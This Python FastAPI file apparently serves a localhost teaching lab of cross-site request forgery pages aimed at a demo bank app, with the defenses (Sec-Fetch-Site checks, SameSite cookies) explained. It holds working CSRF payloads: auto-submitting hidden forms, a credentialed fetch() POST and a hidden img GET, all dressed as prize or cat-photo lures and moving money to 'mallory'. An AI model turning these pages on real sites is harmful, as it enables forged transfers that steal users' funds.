"""
Attacker App - Simulates a malicious site hosting CSRF attacks.

Runs on bar.localhost:9000. Contains pages that attempt cross-origin
requests to the bank app on foo.localhost:8000.
"""

import os
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse

app = FastAPI(title="Attacker App (bar.localhost)")


@app.get("/", response_class=HTMLResponse)
async def home():
    return """<!DOCTYPE html>
<html>
<head><title>Attacker Site</title>
<style>
  body { font-family: system-ui; max-width: 700px; margin: 40px auto; padding: 0 20px;
         background: #1a1a2e; color: #eee; }
  .card { border: 1px solid #444; border-radius: 8px; padding: 20px; margin: 20px 0;
          background: #16213e; }
  a { color: #e94560; }
  h1 { color: #e94560; }
  code { background: #0f3460; padding: 2px 6px; border-radius: 3px; }
</style>
</head>
<body>
  <h1>Evil Attacker Site</h1>
  <p>This site (bar.localhost:9000) hosts CSRF attack pages that target
     the bank app on foo.localhost:8000.</p>

  <div class="card">
    <h2>Attack 1: Hidden Form POST</h2>
    <p>Classic CSRF - auto-submits a hidden form to the vulnerable endpoint.</p>
    <p><a href="/attack/form-auto">Launch Attack (auto-submit)</a></p>
    <p><a href="/attack/form-click">Launch Attack (click to submit)</a></p>
  </div>

  <div class="card">
    <h2>Attack 2: Fetch API POST</h2>
    <p>Uses JavaScript fetch() to send a cross-origin POST.</p>
    <p><a href="/attack/fetch">Launch Fetch Attack</a></p>
  </div>

  <div class="card">
    <h2>Attack 3: Image Tag GET</h2>
    <p>Uses an img tag to trigger a GET request (only works if server
       handles state changes on GET - which it shouldn't).</p>
    <p><a href="/attack/img">Launch IMG Attack</a></p>
  </div>

  <div class="card">
    <h2>Attack Against Protected Endpoint</h2>
    <p>Same attacks but targeting the /protected/* endpoints.</p>
    <p><a href="/attack/protected-form">Form POST → Protected</a></p>
    <p><a href="/attack/protected-fetch">Fetch POST → Protected</a></p>
  </div>
</body>
</html>"""


@app.get("/attack/form-auto", response_class=HTMLResponse)
async def attack_form_auto():
    return """<!DOCTYPE html>
<html>
<head><title>Free iPad!</title></head>
<body>
<h1>Congratulations! You've won a free iPad!</h1>
<p>Click below to claim your prize...</p>

<!-- Hidden CSRF form that auto-submits -->
<form id="csrf-form" action="http://foo.localhost:8000/vulnerable/transfer" method="POST"
      style="display:none">
  <input type="hidden" name="to" value="mallory" />
  <input type="hidden" name="amount" value="5000" />
</form>

<script>
// Auto-submit the form
document.getElementById('csrf-form').submit();
</script>

<noscript>
  <p>JavaScript is required. Please enable JavaScript and reload.</p>
</noscript>
</body>
</html>"""


@app.get("/attack/form-click", response_class=HTMLResponse)
async def attack_form_click():
    return """<!DOCTYPE html>
<html>
<head><title>Free iPad!</title>
<style>
  body { font-family: system-ui; max-width: 700px; margin: 40px auto;
         background: #1a1a2e; color: #eee; padding: 0 20px; }
  button { padding: 16px 32px; font-size: 1.2em; background: #e94560;
           color: white; border: none; border-radius: 8px; cursor: pointer; }
  .info { margin-top: 30px; padding: 20px; background: #16213e;
          border: 1px solid #444; border-radius: 8px; }
  code { background: #0f3460; padding: 2px 6px; border-radius: 3px; }
</style>
</head>
<body>
<h1>Free iPad Giveaway!</h1>
<p>Click the button below to claim your prize!</p>

<!-- The "claim prize" button is actually a CSRF form -->
<form action="http://foo.localhost:8000/vulnerable/transfer" method="POST">
  <input type="hidden" name="to" value="mallory" />
  <input type="hidden" name="amount" value="5000" />
  <button type="submit">Claim Your Free iPad!</button>
</form>

<div class="info">
  <h3>What's really happening:</h3>
  <p>This form submits a POST to <code>http://foo.localhost:8000/vulnerable/transfer</code>
     with <code>to=mallory&amount=5000</code>.</p>
  <p>If you're logged into the bank app, your browser will include your
     session cookie, and the transfer will go through!</p>
</div>
</body>
</html>"""


@app.get("/attack/fetch", response_class=HTMLResponse)
async def attack_fetch():
    return """<!DOCTYPE html>
<html>
<head><title>Fetch CSRF Attack</title>
<style>
  body { font-family: system-ui; max-width: 700px; margin: 40px auto;
         background: #1a1a2e; color: #eee; padding: 0 20px; }
  .result { margin-top: 20px; padding: 20px; background: #16213e;
            border: 1px solid #444; border-radius: 8px; }
  pre { white-space: pre-wrap; }
  code { background: #0f3460; padding: 2px 6px; border-radius: 3px; }
</style>
</head>
<body>
<h1>Fetch API CSRF Attack</h1>
<p>Attempting to POST to <code>http://foo.localhost:8000/vulnerable/transfer</code> via fetch()...</p>

<div class="result" id="result">Sending request...</div>

<script>
async function attack() {
    const resultDiv = document.getElementById('result');
    try {
        const formData = new URLSearchParams();
        formData.append('to', 'mallory');
        formData.append('amount', '1000');

        const response = await fetch('http://foo.localhost:8000/vulnerable/transfer', {
            method: 'POST',
            credentials: 'include',
            body: formData,
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
        });

        // Note: we may not be able to read the response due to CORS,
        // but the request was still SENT (and the damage done).
        resultDiv.innerHTML = `
            <h3>Request sent!</h3>
            <p>Status: ${response.status} (if readable)</p>
            <p>Note: Even if CORS blocks reading the response, the POST
               request was still <strong>sent and processed</strong> by the server.
               The money has been transferred!</p>
        `;
    } catch (e) {
        resultDiv.innerHTML = `
            <h3>Request result:</h3>
            <p>Error: ${e.message}</p>
            <p>Note: CORS may have blocked reading the response, but the POST
               request may still have been <strong>sent and processed</strong>.
               Check the bank app to see if the transfer went through.</p>
        `;
    }
}
attack();
</script>
</body>
</html>"""


@app.get("/attack/img", response_class=HTMLResponse)
async def attack_img():
    return """<!DOCTYPE html>
<html>
<head><title>IMG CSRF</title>
<style>
  body { font-family: system-ui; max-width: 700px; margin: 40px auto;
         background: #1a1a2e; color: #eee; padding: 0 20px; }
  .info { margin-top: 20px; padding: 20px; background: #16213e;
          border: 1px solid #444; border-radius: 8px; }
</style>
</head>
<body>
<h1>Cute Cat Photos!</h1>
<!-- This img tag makes a GET request. Only effective if the server
     processes state changes on GET (a bug). -->
<img src="http://foo.localhost:8000/vulnerable/transfer?to=mallory&amount=100"
     style="display:none" />
<p>Loading adorable cats...</p>
<div class="info">
  <p>This page includes a hidden img tag that sends a GET request to the
     bank's transfer endpoint. This only works if the bank wrongly handles
     transfers on GET requests. Properly designed apps only accept POST for
     state changes, so this attack would fail.</p>
</div>
</body>
</html>"""


@app.get("/attack/protected-form", response_class=HTMLResponse)
async def attack_protected_form():
    return """<!DOCTYPE html>
<html>
<head><title>CSRF vs Protected Endpoint</title>
<style>
  body { font-family: system-ui; max-width: 700px; margin: 40px auto;
         background: #1a1a2e; color: #eee; padding: 0 20px; }
  .info { margin-top: 20px; padding: 20px; background: #16213e;
          border: 1px solid #444; border-radius: 8px; }
  button { padding: 12px 24px; font-size: 1em; background: #e94560;
           color: white; border: none; border-radius: 8px; cursor: pointer; }
</style>
</head>
<body>
<h1>CSRF Attack → Protected Endpoint</h1>
<p>This form targets the <strong>protected</strong> transfer endpoint.</p>

<form action="http://foo.localhost:8000/protected/transfer" method="POST">
  <input type="hidden" name="to" value="mallory" />
  <input type="hidden" name="amount" value="5000" />
  <button type="submit">Submit CSRF Attack</button>
</form>

<div class="info">
  <h3>Why this should fail:</h3>
  <p>The protected endpoint checks the <code>Sec-Fetch-Site</code> header.
     Since this request comes from <code>bar.localhost:9000</code> targeting
     <code>foo.localhost:8000</code>, the browser will set
     <code>Sec-Fetch-Site: cross-site</code>, and the server will reject it.</p>
  <p>Additionally, the cookie uses <code>SameSite=Lax</code>, so the browser
     won't send it with this cross-site POST at all.</p>
</div>
</body>
</html>"""


@app.get("/attack/protected-fetch", response_class=HTMLResponse)
async def attack_protected_fetch():
    return """<!DOCTYPE html>
<html>
<head><title>Fetch CSRF vs Protected</title>
<style>
  body { font-family: system-ui; max-width: 700px; margin: 40px auto;
         background: #1a1a2e; color: #eee; padding: 0 20px; }
  .result { margin-top: 20px; padding: 20px; background: #16213e;
            border: 1px solid #444; border-radius: 8px; }
  pre { white-space: pre-wrap; color: #aaa; }
</style>
</head>
<body>
<h1>Fetch CSRF Attack → Protected Endpoint</h1>
<p>Attempting to POST via fetch() to the protected endpoint...</p>
<div class="result" id="result">Sending request...</div>

<script>
async function attack() {
    const resultDiv = document.getElementById('result');
    try {
        const formData = new URLSearchParams();
        formData.append('to', 'mallory');
        formData.append('amount', '1000');

        const response = await fetch('http://foo.localhost:8000/protected/transfer', {
            method: 'POST',
            credentials: 'include',
            body: formData,
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
        });

        const text = await response.text();
        resultDiv.innerHTML = `
            <h3>Result:</h3>
            <p>Status: ${response.status}</p>
            <pre>${text}</pre>
            <p>The server should have rejected this with a 403!</p>
        `;
    } catch (e) {
        resultDiv.innerHTML = `
            <h3>Result:</h3>
            <p>Error: ${e.message}</p>
            <p>The request was blocked! Either by CORS preflight or by the
               server's CSRF protection. Check the server logs.</p>
        `;
    }
}
attack();
</script>
</body>
</html>"""


if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", 9000))
    uvicorn.run(app, host="0.0.0.0", port=port)
